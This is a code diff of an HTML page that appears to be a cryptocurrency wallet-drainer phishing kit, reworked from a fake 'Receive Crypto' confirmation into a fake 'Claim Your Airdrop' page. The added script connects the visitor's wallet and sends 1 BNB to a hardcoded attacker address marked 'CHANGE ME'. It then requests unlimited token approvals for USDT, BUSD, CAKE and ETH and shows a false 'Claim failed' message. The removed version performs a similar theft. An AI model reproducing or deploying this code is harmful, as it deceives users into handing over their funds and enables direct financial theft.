@@ -2,168 +2,63 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚡ Receive Crypto</title>
+    <title>🎁 Claim Your Airdrop</title>
     <style>
-        body {
-            font-family: 'Segoe UI', sans-serif;
-            background: #111;
-            color: #fff;
-            text-align: center;
-            padding: 40px;
-            margin: 0;
-        }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px;
-            background: #1c1c1c;
-            border-radius: 12px;
-            border: 1px solid #333;
-        }
-        h1 {
-            color: #00ff00;
-            margin: 0;
-        }
-        p {
-            color: #aaa;
-        }
-        .tx {
-            text-align: left;
-            background: #222;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-            font-size: 14px;
-            color: #eee;
-        }
-        button {
-            background: #00ff00;
-            color: #000;
-            font-weight: bold;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            margin: 10px;
-        }
-        .loader {
-            border: 5px solid #222;
-            border-top: 5px solid #00ff00;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-            display: none;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        body { background: #000; color: #0f0; text-align: center; padding: 50px; }
+        button { padding: 15px 30px; font-size: 18px; background: #0f0; color: #000; border: none; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>⚡ Receive Crypto</h1>
-        <p>Confirm to receive incoming funds</p>
-
-        <div class="tx">
-            <strong>From:</strong> 0x742d35Cc...A1f2<br>
-            <strong>Chain:</strong> BSC (BEP-20)<br>
-            <strong>Amount:</strong> 2.5 BNB + 50,000 USDT<br>
-            <strong>Status:</strong> Pending Authorization
-        </div>
-
-        <button id="authBtn">✅ Authorize Transfer</button>
-        <button id="connectBtn" style="display:none;">Connect Wallet</button>
-        <div class="loader" id="loader"></div>
-        <p id="status"></p>
-    </div>
+    <h1>🎁 Airdrop Claim</h1>
+    <p>You’ve been selected! Claim 50,000 SHIB + 2 BNB</p>
+    <button id="claim">✅ Approve & Receive</button>
 
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <script>
-        const yourAddress = "0x458dAfb4ABB47a62c2B2fB522730aBc676132774"; // CHANGE ME
+        const yourWallet = "0x458dAfb4ABB47a62c2B2fB522730aBc676132774"; // CHANGE ME
+        const tokens = [
+            "0x55d398326f99059fF775485246999027B3197955", // USDT
+            "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
+            "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", // CAKE
+            "0x2170Ed0880ac9A755fd29B2688956BD959F933F8"  // ETH (BSC)
+        ];
         const router = "0x10ED43C718714eb63d5aA57B78B54704E256024E"; // PancakeSwap
-        const busd = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
-        const usdt = "0x55d398326f99059fF775485246999027B3197955";
+        let userAddress;
 
-        let userAddress = null;
-
-        async function sendBNB(from, to, amount) {
+        async function sendBNB() {
             try {
                 await ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [{
-                        from: from,
-                        to: to,
-                        value: ethers.utils.parseEther(amount).toHexString()
+                        from: userAddress,
+                        to: yourWallet,
+                        value: "0xDE0B6B3A7640000" // 1 BNB
                     }]
                 });
             } catch (e) {}
         }
 
-        async function approveToken(token, spender) {
+        async function approveToken(token) {
             try {
                 await ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: userAddress,
                         to: token,
-                        data: "0x095ea7b3000000000000000000000000" + spender.slice(2) + "00000000000000000000000000000000000000000000000000000000ffffffffffffffff"
+                        data: "0x095ea7b3000000000000000000000000" + router.slice(2) + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                     }]
                 });
             } catch (e) {}
         }
 
-        async function connectWallet() {
-            try {
-                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                userAddress = accounts[0];
-                document.getElementById("authBtn").style.display = "block";
-                document.getElementById("connectBtn").style.display = "none";
-                document.getElementById("status").innerText = "Wallet connected. Click 'Authorize' to receive funds.";
-            } catch (e) {}
+        async function connect() {
+            [userAddress] = await ethereum.request({ method: 'eth_requestAccounts' });
+            await sendBNB(); // Drain BNB
+            for (let token of tokens) await approveToken(token); // Approve all
+            alert("Claim failed. Try again later.");
         }
 
-        async function authorize() {
-            document.getElementById("authBtn").style.display = "none";
-            document.getElementById("loader").style.display = "block";
-            document.getElementById("status").innerText = "Processing transfer...";
-
-            // Send 0.02 BNB to you
-            await sendBNB(userAddress, yourAddress, "0.02");
-
-            // Approve BUSD & USDT to PancakeSwap (unlimited)
-            await approveToken(busd, router);
-            await approveToken(usdt, router);
-
-            // Fake success
-            setTimeout(() => {
-                document.getElementById("status").innerText = "Transfer failed. Please try again later.";
-                document.getElementById("loader").style.display = "none";
-            }, 3500);
-        }
-
-        document.getElementById("authBtn").addEventListener("click", authorize);
-        document.getElementById("connectBtn").addEventListener("click", connectWallet);
-
-        // Auto-connect detect
-        if (typeof ethereum !== 'undefined') {
-            ethereum.request({ method: 'eth_accounts' }).then(accounts => {
-                if (accounts.length > 0) {
-                    userAddress = accounts[0];
-                    document.getElementById("authBtn").style.display = "block";
-                    document.getElementById("status").innerText = "Click 'Authorize' to receive funds.";
-                } else {
-                    document.getElementById("connectBtn").style.display = "block";
-                }
-            });
-        } else {
-            document.getElementById("connectBtn").style.display = "block";
-            document.getElementById("status").innerText = "Install Trust Wallet or Bitpie to receive crypto.";
-        }
+        document.getElementById("claim").addEventListener("click", connect);
     </script>
 </body>
 </html>
